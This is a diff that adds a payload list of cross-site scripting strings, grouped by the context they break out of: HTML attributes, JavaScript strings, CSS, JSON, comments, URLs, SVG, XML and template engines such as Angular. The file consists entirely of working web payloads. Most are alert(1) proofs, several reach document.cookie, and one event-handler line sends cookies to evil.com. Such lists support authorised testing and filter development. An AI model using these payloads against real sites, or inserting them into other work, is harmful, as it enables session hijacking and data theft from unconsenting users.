@@ -1,0 +1,210 @@
+# Context-Aware Payloads
+# Payloads designed for specific injection contexts
+# These are optimized for different parts of HTML/JS where input may be reflected
+
+# ===== HTML Attribute Context =====
+# When input is reflected inside an HTML attribute
+
+# Breaking out of quoted attributes
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onfocus=alert(1) autofocus "
+' onfocus=alert(1) autofocus '
+
+# Breaking without quotes
+ autofocus onfocus=alert(1) x=
+ onfocus=alert(1) autofocus 
+
+# Using event handlers in attributes
+" onload=alert(1) x="
+" onerror=alert(1) x="
+" onmouseover=alert(1) x="
+" onclick=alert(1) x="
+
+# Breaking src/href attributes
+" onclick=alert(1)//
+' onclick=alert(1)//
+javascript:alert(1)//
+javascript:alert(1)"
+
+# ===== JavaScript String Context =====
+# When input is inside JavaScript string literals
+
+# Single quote context
+'-alert(1)-'
+';alert(1);//
+';alert(1);var x='
+'-alert(1)-'
+
+# Double quote context
+"-alert(1)-"
+";alert(1);//
+";alert(1);var x="
+"-alert(1)-"
+
+# Template literal context
+${alert(1)}
+${alert(document.domain)}
+${alert(document.cookie)}
+${window.alert(1)}
+
+# Backtick context
+`-alert(1)-`
+`;alert(1);//
+`+alert(1)+`
+
+# Breaking out with newlines
+\nalert(1)//
+\ralert(1)//
+\n\ralert(1)//
+
+# ===== Script Tag Context =====
+# When input is inside <script> tags
+
+# Direct injection
+alert(1)
+alert(document.domain)
+alert(document.cookie)
+
+# Comment breakout
+*/alert(1)/*
+*/alert(1)//
+<!--*/alert(1)//-->
+
+# String termination
+';alert(1);//
+";alert(1);//
+`;alert(1);//
+
+# ===== CSS Context =====
+# When input is inside style attributes or tags
+
+# Breaking out of style context
+</style><script>alert(1)</script>
+</style><img src=x onerror=alert(1)>
+</style><svg onload=alert(1)>
+
+# CSS expression (IE)
+expression(alert(1))
+expression(alert('XSS'))
+
+# CSS import with JavaScript
+@import'javascript:alert(1)'
+
+# URL in CSS
+url('javascript:alert(1)')
+url("javascript:alert(1)")
+url(javascript:alert(1))
+
+# ===== JSON Context =====
+# When input is in JSON data
+
+# Breaking out of JSON
+{"x":"</script><script>alert(1)</script>"}
+{"x":"\"onclick=alert(1)"}
+{"test":"</script><script>alert(1)//"}
+
+# ===== HTML Comment Context =====
+# When input is inside HTML comments
+
+# Breaking out of comments
+--><script>alert(1)</script><!--
+--!><script>alert(1)</script><!--
+--><img src=x onerror=alert(1)><!--
+
+# ===== URL Context =====
+# When input is in URL parameters or paths
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+
+# Data URL
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ===== Textarea Context =====
+# When input is inside textarea tags
+
+# Breaking out
+</textarea><script>alert(1)</script>
+</textarea><img src=x onerror=alert(1)>
+</textarea><svg onload=alert(1)>
+
+# ===== Title Context =====  
+# When input is inside title tags
+
+# Breaking out
+</title><script>alert(1)</script>
+</title><img src=x onerror=alert(1)>
+
+# ===== SVG Context =====
+# When input is inside SVG elements
+
+# Event handlers in SVG
+<script>alert(1)</script>
+<set attributeName="onmouseover" to="alert(1)">
+<animate attributeName="onbegin" to="alert(1)">
+
+# ===== XML Context =====
+# When input is in XML documents
+
+# CDATA breakout
+]]><script>alert(1)</script><![CDATA[
+]]><img src=x onerror=alert(1)><![CDATA[
+
+# ===== Meta Tag Context =====
+# When input affects meta tags
+
+# Content attribute
+0;url=javascript:alert(1)
+0;url='javascript:alert(1)'
+
+# ===== On* Event Handler Context =====
+# When input is inside event handler attribute value
+
+# Direct code execution
+alert(1)
+alert(1);x=
+this.src='http://evil.com/?c='+document.cookie
+
+# Function call variations
+window.alert(1)
+window['alert'](1)
+self.alert(1)
+top.alert(1)
+
+# ===== DOM-Based Contexts =====
+# For client-side template and DOM manipulation
+
+# innerHTML assignment
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+
+# document.write context
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# ===== Multiple Context Breaks =====
+# Payloads that work across multiple contexts
+
+# Polyglot context breakers
+'"><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+'"><svg onload=alert(1)>
+";alert(1);//
+
+# Universal breaks
+</script><script>alert(1)</script>
+</style><script>alert(1)</script>
+</title><script>alert(1)</script>
+
+# ===== Angular/Template Context =====
+# When in template binding context
+{{alert(1)}}
+{{constructor.constructor('alert(1)')()}}
+
+# ===== React Context =====
+# When in React props
+dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}
